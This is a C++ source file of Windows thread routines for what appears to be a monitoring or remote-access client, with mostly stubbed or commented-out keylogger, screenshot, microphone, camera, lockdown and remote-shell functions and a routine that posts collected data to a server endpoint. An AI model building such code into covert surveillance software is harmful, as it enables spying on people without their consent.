#include "taskRoutines.h"
#include <string>

DWORD WINAPI initFiltering(LPVOID lpParam)
{
    return 0;
}
DWORD WINAPI initKeylogger(LPVOID lpParam)
{
 //   keylogger();
    while (1) {
        Sleep(1);
    }
    return 0;
}
DWORD WINAPI initScreenshot(LPVOID lpParam)
{
    // TODO: Get screen resolution
    // Capture in requested interval
  //  screenCapture(0, 0, 1920, 1080, "screenshot.bmp");

    return 0;
}
DWORD WINAPI initTimeLockdown(LPVOID lpParam)
{
    return 0;
}
DWORD WINAPI initCamera(LPVOID lpParam)
{
    camera();
    return 0;
}
DWORD WINAPI initMic(LPVOID lpParam)
{
  //  recordWAVEFile((DWORD)5000);
    return 0;
}
DWORD WINAPI initRemoteLockdown(LPVOID lpParam)
{
    return 0;
}
DWORD WINAPI initShell(LPVOID lpParam)
{
    return 0;
}
DWORD WINAPI sendItem(LPVOID lpParam, LPSTR itemType)
{
    LPSTR success = NULL;
    LPCWSTR deviceID = L"1aa46bc6-4f58-4027-9980-c82badac16c9"; // TODO : Get real device ID
    while (success == NULL) {
        Data newItem;
        newItem.dataType = itemType;
        newItem.dataAttributes = (char*)lpParam;
        char* myJson = jsonFromItem(&newItem, DATA);

        LPCWSTR additionalHeaders = L"Accept:application/json\r\nContent-Type:application/json\r\n\r\n";
        char* postData = myJson;

        std::wstring mywstring(deviceID);
        std::wstring concatted_stdstr = L"/data/add/" + mywstring;
        LPCWSTR apiUrl = concatted_stdstr.c_str();

        LPCWSTR method = L"POST";

       success = SendRequest(additionalHeaders, postData, apiUrl, method);
    }
    return 0;
}



